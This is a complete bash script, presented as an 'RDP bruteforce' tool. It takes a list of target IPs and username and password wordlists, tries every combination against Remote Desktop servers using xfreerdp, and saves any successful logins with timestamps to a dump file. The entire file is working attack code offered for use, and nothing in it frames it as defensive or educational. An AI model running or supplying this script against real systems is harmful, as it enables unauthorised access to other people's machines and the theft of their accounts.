#!/bin/bash

echo "$(<./ascii.txt )"

echo "--[ TOOL ]--[ RDP BRUTEFORCE ]--[ SUJAL TULADHAR ]"

# Initialize variables
usernames_file=""
passwords_file=""
rdp_server=""

# Read activeRDPs.txt into an array
mapfile -t activeRDPs < "./activeRDPs.txt"

# Function to check file existence
check_file_exists() {
    if [ ! -f "$1" ]; then
        echo -e "\e[91m$2 file not found. Please check the file path.\e[0m"
        exit 1
    fi
}

# Function to write to dump.txt
write_to_dump() {
    local message="$1"
    if [ ! -f "dump.txt" ]; then
        echo "$message" > "dump.txt"
    else
        echo "$message" >> "dump.txt"
    fi
}

# Function to attempt an RDP connection and display results
attempt_rdp_connection() {
    local username="$1"
    local password="$2"
    local rdp_server="$3"

    if xfreerdp /u:"$username" /p:"$password" /v:"$rdp_server" &> /dev/null; then
    # Success message with timestamp in green
        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        message="[$timestamp] Status: Successful - RDP connection with Username: $username, Password: $password, IP: $rdp_server"
        echo -e "\e[92m$message\e[0m"
        write_to_dump "$message"

    else
        # Failure message in red
        message="Status: Failed - RDP connection with Username: $username, Password: $password, IP: $rdp_server"
        echo -e "\e[91m$message\e[0m"
    fi
}

# GUI prompts for user inputs
usernames_file=$(zenity --file-selection --title="Select the username file" --text="Select the usernames.txt file:")
passwords_file=$(zenity --file-selection --title="Select the password file" --text="Select the passwords.txt file:")

# Check if the user canceled the file selection
check_file_exists "$usernames_file" "Usernames"
check_file_exists "$passwords_file" "Passwords"

# Read usernames and passwords into arrays
passwords=($(cat "$passwords_file"))

# Iterate over each line in the activeRDPs.txt file
for ip in "${activeRDPs[@]}"; do
    # Skip empty lines
    [ -z "$ip" ] && continue

    # Iterate over each line in the usernames file
    while IFS= read -r line; do
        # Skip empty lines
        [ -z "$line" ] && continue

        # Use line breaks as the delimiter to split the line into an array of usernames
        IFS=$'\n' read -a usernames <<< "$line"

        # Iterate over each username
        for username in "${usernames[@]}"; do
            for password in "${passwords[@]}"; do
                attempt_rdp_connection "$username" "$password" "$ip" &  # Run in the background
                sleep 1  # Adjust sleep time if needed
            done
        done
    done < "$usernames_file"
done

# Inform the user that the script has completed
echo "RDP connection attempts completed."
